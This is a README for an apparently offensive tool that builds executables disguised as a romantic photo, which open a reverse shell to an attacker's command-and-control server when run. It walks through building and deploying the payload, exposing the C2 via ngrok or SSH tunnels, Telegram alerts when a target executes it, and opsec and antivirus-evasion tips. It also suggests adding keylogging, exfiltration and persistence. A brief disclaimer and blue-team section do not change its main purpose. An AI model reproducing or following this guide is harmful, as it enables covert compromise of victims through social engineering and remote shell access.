# Polyglot Image Malware Framework

Advanced payload delivery system using steganographic techniques and social engineering vectors.

## Overview

This framework demonstrates polyglot file exploitation - creating executables disguised as innocent image files. When executed, the target displays a romantic image while establishing a reverse shell connection to the C2 infrastructure.

**Tested on:**
- Linux x64 (Arch, Ubuntu, Debian)
- Windows 10/11 x64

## Technical Details

### Attack Vector

```
Social Engineering Image → Embedded Payload → C2 Connection
```

The payload:
1. Decodes embedded image from Base64
2. Displays image using system viewer (social engineering)
3. Establishes reverse TCP connection to C2 server
4. Provides interactive shell access

### Architecture

```
┌─────────────────────────────────┐
│  Romantic Image (JPG)           │  ← Social Engineering Layer
├─────────────────────────────────┤
│  Python Wrapper Script          │  ← Execution Layer
├─────────────────────────────────┤
│  Reverse Shell Payload          │  ← C2 Communication
└─────────────────────────────────┘
```

## Installation

### Linux

```bash
# System dependencies
sudo pacman -S python-pillow python-requests

# PyInstaller (for compilation)
sudo pacman -S python-pipx
pipx install pyinstaller
pipx ensurepath
```

### Windows

```bash
pip install pillow pyinstaller requests
```

## Usage

### Build Payload

**Linux:**
```bash
python builder/polyglot_builder.py
```

**Windows:**
```bash
python builder\polyglot_builder.py
```

**Configuration:**
- C2 Host: Your IP or domain
- C2 Port: 4444 (default)
- Telegram: Optional C2 notifications
- Output: Executable name

### Deploy C2 Server

```bash
python c2_server.py 4444
```

The C2 server will listen for incoming connections and provide an interactive shell.

### Execute Payload

**Linux:**
```bash
./dist/love_photo
```

**Windows:**
```bash
dist\love_photo.exe
```

## C2 Commands

Once connected, you have full shell access:

```bash
[192.168.1.100]> whoami
[192.168.1.100]> pwd
[192.168.1.100]> ls -la
```

**Special commands:**
- `help` - Show available commands
- `disconnect` - Close current connection
- `exit` - Terminate session

## Operational Security

### Recommendations

1. **Use VPN/Proxy** - Never expose your real IP
2. **Encrypt traffic** - Consider SSH tunneling or VPN
3. **Clean artifacts** - Remove build files after deployment
4. **Test in isolated environment** - Use VMs for testing

### Detection Vectors

This tool can be detected by:
- Antivirus signatures (PyInstaller patterns)
- Network monitoring (unencrypted C2 traffic)
- Behavioral analysis (suspicious network connections)

### Evasion Techniques

- Compile on target OS to avoid cross-compilation signatures
- Use custom packers instead of PyInstaller
- Implement encrypted C2 communications
- Add junk code for signature evasion

## Remote Access Setup

### Using ngrok

```bash
# Terminal 1: Start C2
python c2_server.py 4444

# Terminal 2: Expose via ngrok
ngrok tcp 4444

# Use ngrok URL in builder
C2 Host: 0.tcp.ngrok.io
C2 Port: <ngrok_port>
```

### Using SSH Tunnel

```bash
# On VPS
ssh -R 4444:localhost:4444 user@your-vps.com

# Build with VPS IP
C2 Host: your-vps.com
C2 Port: 4444
```

## Telegram Integration

Enable Telegram notifications to receive connection alerts:

```bash
Enable Telegram? y
Bot Token: 123456789:ABCdefGHIjklMNOpqrsTUVwxyz
Chat ID: 987654321
```

You'll receive notifications when:
- Target executes payload
- Connection established
- Errors occur

## Development

### Project Structure

```
.
├── builder/
│   └── polyglot_builder.py    # Payload builder
├── c2_server.py               # Command & Control server
├── dist/                      # Compiled executables
├── payloads/                  # Generated payloads
└── README.md
```

### Adding Features

The payload code is in `create_payload()` function. Extend it with:
- Screenshot capture
- Keylogging
- File exfiltration
- Persistence mechanisms

## Legal Disclaimer

This tool is provided for educational and authorized security testing purposes only.

**You must:**
- Obtain written permission before testing
- Only use on systems you own or have authorization to test
- Comply with all applicable laws and regulations

**Unauthorized access to computer systems is illegal.**

The authors assume no liability for misuse of this software.

## Detection & Defense

### For Blue Team

**Indicators of Compromise:**
- Outbound connections to unusual IPs on port 4444
- PyInstaller-compiled executables
- Suspicious image files with large file sizes
- Base64-encoded data in executables

**Detection Methods:**
```bash
# Check active connections
netstat -tulpn | grep 4444

# Analyze suspicious files
strings suspicious_file | grep -i "python"
file suspicious_file
```

**Mitigation:**
- Network segmentation
- Egress filtering
- Application whitelisting
- User awareness training

## References

- [MITRE ATT&CK - Command and Control](https://attack.mitre.org/tactics/TA0011/)
- [MITRE ATT&CK - Execution](https://attack.mitre.org/tactics/TA0002/)
- [Polyglot Files Research](https://github.com/Polydet/polyglot-database)

## Credits

Developed for security research and red team operations.

**Framework:** APT Simulation Toolkit  
**Version:** 1.0  
**License:** Educational Use Only

---

*Remember: With great power comes great responsibility. Use ethically.*
